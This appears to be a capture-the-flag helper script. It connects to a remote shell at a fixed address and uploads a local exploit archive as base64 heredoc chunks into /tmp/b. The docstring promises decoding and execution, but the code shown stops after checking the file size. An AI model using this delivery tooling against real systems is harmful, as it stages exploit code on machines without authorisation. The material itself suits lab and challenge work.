#!/usr/bin/env python3
"""Upload exploit as ONE big heredoc, then decode and run."""
import socket
import time
import base64

HOST = '154.57.164.73'
PORT = 31873

def recv_all(s, timeout=5):
    s.settimeout(timeout)
    data = b''
    while True:
        try:
            chunk = s.recv(65536)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
    return data

def main():
    with open('exploit.gz', 'rb') as f:
        compressed = f.read()
    
    b64 = base64.b64encode(compressed).decode()
    print(f"[*] Compressed: {len(compressed)} bytes")
    print(f"[*] Base64: {len(b64)} chars")
    
    s = socket.socket()
    s.settimeout(60)
    s.connect((HOST, PORT))
    
    # Wait for boot + prompt
    data = b''
    while b'/ $' not in data:
        data += s.recv(4096)
    print(f"[*] Boot ({len(data)} bytes)")
    
    # Create the heredoc file in several pieces using cat append
    # Split b64 into chunks that won't overwhelm the shell
    chunk_size = 2000  # chars per heredoc
    parts = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
    print(f"[*] Uploading {len(parts)} parts...")
    
    for i, part in enumerate(parts):
        heredoc = f"cat >> /tmp/b << 'X'\n{part}\nX"
        s.sendall(heredoc.encode() + b'\n')
        # Wait for the shell prompt after each heredoc
        data = b''
        found = False
        deadline = time.time() + 15
        while time.time() < deadline and not found:
            try:
                chunk = s.recv(4096)
                if b'/ $' in chunk:
                    found = True
                data += chunk
            except socket.timeout:
                break
        if i % 30 == 0:
            print(f"  {i}/{len(parts)}")
    
    print("[*] Upload done. Verifying...")
    s.sendall(b"wc -c /tmp/b\n")
    time.sleep(3)
    data = recv_all(s, 5)
    print(repr(data))
    
    # Check if size is correct
    resp = data.decode(errors='replace')
    expected_b64 = len(b64)
    
    # Try decoding
    s.sendall(b"cat /tmp/b | wc -c\n")
    time.sleep(2)
    data = recv_all(s, 5)
    print(repr(data))
    
    s.close()

if __name__ == '__main__':
    main()
